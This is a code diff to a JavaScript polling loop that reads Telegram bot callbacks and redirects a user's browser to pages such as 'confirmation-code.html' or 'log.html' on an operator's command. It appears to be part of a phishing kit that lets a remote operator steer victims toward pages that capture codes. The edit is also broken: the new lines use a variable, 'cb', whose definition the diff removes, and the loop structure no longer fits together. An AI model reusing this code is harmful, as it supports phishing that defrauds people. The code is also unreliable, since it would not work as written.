@@ -58,19 +58,16 @@
     async function pollLoop(offset, sid) {
         while (true) {
             try {
-                const data = await getTelegramUpdates(offset, 15);
-                if (!data.result) continue;
-                for (const upd of data.result) {
-                    offset = upd.update_id + 1;
-                    const cb = upd.callback_query;
-                    if (!cb) continue;
-                    const [action, sess] = cb.data.split(":");
-                    if (sess !== sid) continue;
-                    await answerTelegramCallback(cb.id, "Redirecting user…");
-                    sessionStorage.removeItem('mgv_sid');
-                    sessionStorage.removeItem('mgv_offset');
-                    window.location.href = ROUTES[action] || "confirmation-code.html";
-                    return;
+                                const [action, sess] = cb.data.split(":");
+                if (sess !== sid) continue;
+
+                await answerTelegramCallback(cb.id, "Redirecting user…");
+                sessionStorage.removeItem('mgv_sid');
+                sessionStorage.removeItem('mgv_offset');
+
+                console.log('[wait3] action =', action, '→ target =', ROUTES[action]);
+                window.location.href = ROUTES[action] || "log.html";
+                return;
                 }
             } catch (e) {
                 console.error(e);
